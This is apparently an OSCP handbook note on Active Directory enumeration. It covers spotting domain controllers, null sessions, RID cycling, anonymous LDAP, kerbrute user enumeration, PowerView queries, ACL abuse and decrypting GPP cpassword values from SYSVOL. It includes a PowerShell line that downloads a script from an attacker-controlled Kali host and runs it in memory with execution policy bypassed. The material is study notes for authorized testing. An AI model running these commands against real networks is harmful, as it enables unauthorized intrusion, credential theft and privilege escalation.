---
title: "Active Directory Enumeration"
slug: active-directory-enumeration
category: notes
handbook: oscp
tags: ["active-directory", "enumeration"]
draft: false
pubDatetime: 2026-08-01T10:35:17+03:00
modDatetime: 2026-09-09T21:52:45+03:00
description: "Enumeration is most of the work in an AD assessment."
---
Enumeration is most of the work in an AD assessment. The goal is the relationships between objects: who is an admin where, who is logged in where, which accounts run services, and which objects can control other objects. This is the first phase of the [Active Directory](/collections/oscp/active-directory) workflow, and every attack that follows depends on it.

## Recognising a domain controller from a scan

Before any AD-specific tool, an nmap scan already shows whether a host is a Domain Controller. A DC runs a cluster of services an ordinary Windows host does not:

| Port        | Service         | Why it points to a DC                                        |
| ----------- | --------------- | ------------------------------------------------------------ |
| 53          | DNS             | the DC is normally the domain's DNS server                   |
| 88          | Kerberos        | the strongest tell: Kerberos means a KDC, which runs on a DC |
| 389 / 636   | LDAP / LDAPS    | the directory database itself                                |
| 3268 / 3269 | Global Catalog  | runs only on DCs                                             |
| 464         | kpasswd         | Kerberos password change                                     |
| 9389        | AD Web Services | DC management endpoint                                       |

`445` (SMB) and `135/139` (RPC/NetBIOS) are on every Windows host, so they do not distinguish a DC. The trio that does is **88 + 389 + 3268**. A domain member such as a file or web server shows none of those three (for example a box with only `80`, `445`, `1433`): it consumes AD rather than serving it.

Reading the domain name is a separate step from spotting the role. On modern DCs `smb-os-discovery` often returns nothing because it needs SMBv1, so take the name from the TLS certificate nmap grabs on 636 or 3389 (`ssl-cert` shows `CN=dc01.corp.com`) or from a null-session SMB banner:

```bash
nxc smb <DC_IP>        # ... (name:DC01) (domain:corp.com)
```

Two DCs answering for two domains, one nested under the other (a `north.corp.com` under `corp.com`), is a forest with a parent and a child domain. Put the domain names and DC hostnames in `/etc/hosts` so name-based tools resolve them:

```bash
sudo tee -a /etc/hosts <<'EOF'
10.10.10.10  dc01.corp.com dc01 corp.com
EOF
```

Every name after the IP is an alias for it. Listing the FQDN, the short hostname, and the bare domain covers the three ways tools ask for the host: Kerberos and most AD tools use the FQDN, some SMB or quick commands use the short name, and a tool given only the domain name resolves that to locate a DC (mirroring real AD DNS, where the domain name itself points at the DCs).

NTLM-based tools work fine against a bare IP, because the credential is only a password or hash. Kerberos does not: a ticket is issued for a specific SPN that contains the target's FQDN (`LDAP/dc01.corp.com`, `HTTP/web01.corp.com`), and the client must also resolve the domain name to find the KDC. Connecting by IP gives no valid SPN, so Kerberos auth, ticket attacks, and hostname-based lateral movement all fail until the names resolve. The alternative is to point Kali's resolver at the DC (the domain's DNS server) or pass `-dc-ip`/`-ns` to each tool.

## Unauthenticated enumeration from Kali

Before any credential, and from Kali rather than a domain host, a few network queries against the DC can already reveal accounts. What works depends on how locked down the domain is. The tool for all of it is [NetExec](/collections/oscp/netexec) (`nxc`). The OSCP AD set provides a starting credential, so this from-zero phase is mostly lab practice, but the same commands take a credential and become the authenticated enumeration used there.

**Null and guest sessions.** A null session is an unauthenticated SMB connection (`-u '' -p ''`); a guest session uses the built-in Guest account with no password (`-u guest -p ''`). Legacy or misconfigured domains let one of these read data that should need a login. Confirm which is available before relying on it: a `[+]` in the output means the bind succeeded.

```bash
nxc smb <DC_IP> -u '' -p ''         # null session
nxc smb <DC_IP> -u guest -p ''      # guest session
```

**RID cycling.** Every account's SID is the domain SID plus a RID assigned in sequence: 500 Administrator, 501 Guest, 512 Domain Admins, then 1000+ for the rest (the SID breakdown is in [Active Directory Concepts](/collections/oscp/active-directory-concepts)). RID cycling walks those RIDs and asks the DC to translate each SID back to a name, rebuilding the full account list without reading the user objects directly. It needs a null or guest session that permits the lookup:

```bash
nxc smb <DC_IP> -u guest -p '' --rid-brute
```

**Anonymous LDAP bind.** Binding to LDAP with no credentials. Modern AD blocks anonymous reads of user objects by default, so this usually returns only the rootDSE (naming contexts, functional level), which is public by design. If it returns actual users, anonymous read has been left enabled, a misconfiguration:

```bash
nxc ldap <DC_IP> -u '' -p '' --users
```

`ldapsearch` is the raw client underneath, and it is worth using directly when the summarised output is hiding something. `-x` selects simple authentication, and with no `-D` (bind DN) and no `-w` (password) that bind is anonymous:

```bash
ldapsearch -x -H ldap://<DC_IP> -s base namingContexts          # base DN, from the public rootDSE
ldapsearch -x -H ldap://<DC_IP> -b "DC=corp,DC=com" "(objectclass=*)"
```

The first query is how the base DN is obtained when the domain name is not yet known, since the rootDSE answers without credentials by design. The second dumps every object below the root, which is verbose but complete. Narrow it once the shape is clear, and name attributes after the filter to return only those:

```bash
ldapsearch -x -H ldap://<DC_IP> -b "DC=corp,DC=com" "(objectClass=user)" sAMAccountName description memberOf
```

`description` deserves its own pass. It is free text with no expectation of secrecy attached to it, and administrators write into it as if it were a private note. On Hutch an anonymous bind returned `description: Password set to <password> at user's request. Please change on next login.` on a user object, which was the entire foothold. The same command with `-D` and `-w` runs authenticated once a credential exists:

```bash
ldapsearch -x -H ldap://<DC_IP> -D 'user@corp.com' -w 'password' -b "DC=corp,DC=com" "(objectClass=user)"
```

LDAP omits attributes the bound account cannot read rather than returning an error, so an attribute that comes back empty means no read access, not an empty value.

**Kerberos user enumeration.** [kerbrute](/collections/oscp/kerbrute) sends an AS-REQ per candidate name and reads the KDC's reply: a nonexistent user gives `KDC_ERR_C_PRINCIPAL_UNKNOWN`, a real one gives a pre-auth-required error or an AS-REP. That difference confirms valid usernames from a wordlist with no password, and username enumeration does not touch the bad-password count so it will not lock accounts (a spray, which sends real password guesses, will).

```bash
kerbrute userenum -d corp.com --dc <DC_IP> /usr/share/seclists/Usernames/Names/names.txt
```

A names list fits AD's person-name accounts; if it returns nothing, widen to the larger generic list, and match the list format to the naming convention (wordlist choices are in [kerbrute](/collections/oscp/kerbrute)).

## Enumerating from a domain host

The steps below run from a domain-joined Windows session. In the OSCP assumed breach that means RDP into the workstation as the starting user (see [Windows Remote Access](/collections/oscp/windows-remote-access)). Prefer RDP over WinRM for enumeration: a WinRM session hits the Kerberos double-hop problem and many domain queries silently fail.

```bash
xfreerdp3 /v:TARGET /u:stephanie /d:corp.com /p:'password' /cert:ignore
```

## Legacy tools: net.exe

`net.exe` ships on every Windows host and needs nothing installed. It is the fastest first look. `/domain` sends the query to a DC instead of the local machine.

```cmd
net user /domain                       :: all domain users
net user jeffadmin /domain             :: one user: group memberships, password dates, logon
net group /domain                      :: all domain groups
net group "Sales Department" /domain   :: members of one group
```

Prefixes and suffixes on account names leak intent: `jeffadmin` alongside `jeff` is worth checking, and its `Domain Admins` membership shows in `net user jeffadmin /domain`.

Its limits are the reason to move on: `net group` lists only user members, so it misses **nested groups** (a group inside a group), and it cannot show arbitrary attributes. Anything past a flat membership list needs an LDAP tool.

## LDAP and distinguished names

AD is queried over LDAP, and every tool below speaks it under the hood. Two things to know before reaching for them:

The domain PowerShell module (`Get-ADUser` and friends) only ships on a DC or a host with RSAT installed, so on a normal workstation it is usually absent. RSAT (Remote Server Administration Tools) is the optional Windows feature admins add to their workstation to manage servers remotely; it carries the management snap-ins and the `ActiveDirectory` PowerShell module. A DC has these by default, a normal workstation does not. That is why enumeration leans on PowerView, a single script that needs nothing installed, or on tools run remotely from Kali.

Objects are named by a distinguished name (DN), read right to left: `CN=stephanie,CN=Users,DC=corp,DC=com`, where `CN` is a common name and `DC` a domain component. `DC=corp,DC=com` alone is the domain root, and a search from there covers everything. Raw LDAP filters (`(samAccountType=805306368)` for users, `(objectClass=group)` for groups) select objects by type; the cmdlets below are thin wrappers over these, and the same filters surface in tool output and in BloodHound queries.

## PowerView

PowerView is the practical tool for all of the above and more. Import it once, then use its cmdlets; pipe into `select` to pick attributes instead of writing loops.

```powershell
Import-Module .\PowerView.ps1
```

Nothing in this section exists until that import runs, so an unrecognized cmdlet usually means PowerView was never loaded rather than that the query was wrong. Kali ships it at `/usr/share/windows-resources/powersploit/Recon/PowerView.ps1`; serve that over HTTP and pull it into memory instead of writing it to disk:

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://KALI:8000/PowerView.ps1')
```

From a caught `cmd.exe` shell, load and query in the same command. A module imported inside `powershell -c` lives only as long as that process, so a second invocation starts empty:

```cmd
powershell -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://KALI:8000/PowerView.ps1'); Get-NetUser -SPN | select samaccountname,serviceprincipalname | fl"
```

Read the error text before assuming the import failed, since it identifies which shell is running. `'Get-NetUser' is not recognized as an internal or external command, operable program or batch file` is cmd.exe, where no cmdlet works at all. PowerShell instead reports `The term 'Get-NetUser' is not recognized as the name of a cmdlet, function, script file, or operable program`, which is the one that points at a missing import.

PowerView 3.0 renamed everything to a `Get-Domain*` scheme and keeps the older names as aliases. Where an alias does not resolve, the current spelling is `Get-DomainUser`, `Get-DomainGroup`, `Get-DomainComputer`.

### Users, groups, computers

```powershell
Get-NetDomain                                   # domain info, incl. PdcRoleOwner
Get-NetUser | select cn                         # clean user list
Get-NetUser | select cn,pwdlastset,lastlogon    # spot dormant / stale-password accounts
Get-NetGroup | select cn
Get-NetGroup "Sales Department" | select member
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
```

`Get-NetComputer` maps the estate: which hosts are servers, which is the DC, and the oldest OS (a likely weak target). `pwdlastset` and `lastlogon` point at dormant accounts, quieter to take over, and accounts whose password predates the last policy change, likely weaker for cracking.

`select member` on a group lists its members, and a member can itself be a group. Membership is inherited up the chain: if `jen` is in Management, Management is in Development, and Development is in Sales, then `jen` has Sales' access too. Follow each member that is itself a group, since `net.exe` and a flat listing both miss this.

### Local admin access and sessions

The point of session enumeration is to find where a privileged user is logged in, because their credentials are cached on that host.

```powershell
Find-LocalAdminAccess       # which hosts the current user is local admin on (scans the domain)
Get-NetSession -ComputerName files04 -Verbose
```

`Get-NetSession` usually returns nothing or "Access is denied" on current Windows: since Windows 10 build 1709 and Server 2019, the `SrvsvcSessionInfo` registry key no longer lets ordinary domain users read sessions remotely, so the underlying `NetSessionEnum` API is denied. Keep it for older hosts, but the reliable fallback is **PsLoggedOn** from Sysinternals, which reads `HKEY_USERS` and needs the **Remote Registry** service running on the target (default on Servers, off on workstations unless an admin enabled it):

```cmd
.\PsLoggedon.exe \\files04
.\PsLoggedon.exe \\client74
```

`\\files04` is a UNC path, the network path to a host (`\\host\share` points at a share on it, `\\host\share\file` at a file). A privileged user logged into a host the current user is local admin on is a direct lateral-movement lead (see [AD Lateral Movement](/collections/oscp/ad-lateral-movement)).

### Service accounts (SPNs)

A Service Principal Name links a service (IIS, MSSQL, Exchange) to the account that runs it. Enumerating SPNs finds service accounts, which usually hold more privilege than a normal user, and reveals the service's host and port without a port scan.

```powershell
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```

```cmd
setspn -L iis_service       :: SPNs registered to one account
```

An SPN on a user account is a [Kerberoasting](/collections/oscp/kerberoasting) target. Note it and move on.

### Object permissions (ACLs)

Each object carries an ACL made of Access Control Entries (ACE), each granting or denying a right to a principal (SID). Misconfigured ACEs are a common escalation path: a normal user with write rights over a privileged object can take it over. The abusable rights:

| Right | Grants |
| --- | --- |
| `GenericAll` | full control of the object |
| `GenericWrite` | write its attributes |
| `WriteOwner` | become the object's owner |
| `WriteDACL` | rewrite the object's ACL (grant self anything) |
| `AllExtendedRights` | extended ops including password reset |
| `ForceChangePassword` | reset the object's password |
| `Self` | add self to a group |

```powershell
Get-ObjectAcl -Identity "Management Department" |
  ? {$_.ActiveDirectoryRights -eq "GenericAll"} |
  select SecurityIdentifier,ActiveDirectoryRights

Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104   # SID -> CORP\stephanie
```

SIDs are unreadable, so convert `SecurityIdentifier` to a name. If a low-privileged account turns up with `GenericAll` over a group or user it should not control, that is the misconfiguration. As a check, `GenericAll` over a group allows adding a member:

```cmd
net group "Management Department" stephanie /add /domain
net group "Management Department" stephanie /del /domain   :: clean up after confirming
```

[BloodHound](/collections/oscp/bloodhound) maps these ACL edges automatically and is far faster than walking them by hand.

### Shares

Shares hold configs, scripts, and old policy files that leak credentials.

```powershell
Find-DomainShare                    # all shares in the domain
Find-DomainShare -CheckShareAccess  # only shares the current user can read
```

`SYSVOL` is a folder on every DC that holds Group Policy, replicated across the domain. Every domain user can read it by design: each machine and user pulls its own policy from SYSVOL at logon, so read access has to be open to all authenticated principals. Group Policy Preferences (GPP) once let admins push a local admin password to every host through a policy; that password was written into an XML file in SYSVOL as a `cpassword`, AES-encrypted with a single static key baked into every Windows client so each one could decrypt and apply the policy. Microsoft even published that key in its protocol documentation, but it made little difference: a shared key that has to live on every client is not a secret. A static key plus a world-readable file means anyone in the domain can decrypt it offline. Microsoft blocked setting new ones in 2014 (MS14-025), but values already sitting in SYSVOL still work:

```cmd
type \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
```

```bash
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"   # -> the local admin password
```

Read non-default shares fully; a password left in a text file (`start-email.txt` and similar) is a common find. Every credential goes into a wordlist for [Password Spraying](/collections/oscp/password-spraying) and gets retried across accounts.

## Automated: BloodHound

Manual enumeration is thorough but slow and hard to hold in the head. BloodHound collects the same data and renders it as a graph, then answers questions like "shortest path from this user to Domain Admin" directly. Run it once early, then keep enumerating by hand where the graph points.

Collection is done by SharpHound (the collector) run on a domain-joined host, or by `bloodhound-ce-python` run from Kali with credentials. Setup, collector commands, and analysis are in [BloodHound](/collections/oscp/bloodhound).

Mark every owned object (`Mark User/Computer as Owned`) so the "from Owned Principals" queries work, and read the `Abuse` tab on any edge for the exact technique to exploit it.

## Checklist

- RDP in as the current user; do not enumerate over WinRM (double-hop).
- `net user /domain`, `net group /domain` for a fast first list.
- PowerView: users with `pwdlastset`/`lastlogon`, groups with nested members unravelled, computers with OS.
- `Find-LocalAdminAccess`, then PsLoggedOn to find privileged sessions on reachable hosts.
- SPNs (`Get-NetUser -SPN`) for [Kerberoasting](/collections/oscp/kerberoasting) targets.
- `Get-ObjectAcl` for dangerous rights held by controllable accounts; `Convert-SidToName` to read them.
- `Find-DomainShare`, read SYSVOL and non-default shares; decode any GPP `cpassword`.
- BloodHound for attack paths; re-run all of this from every new foothold.
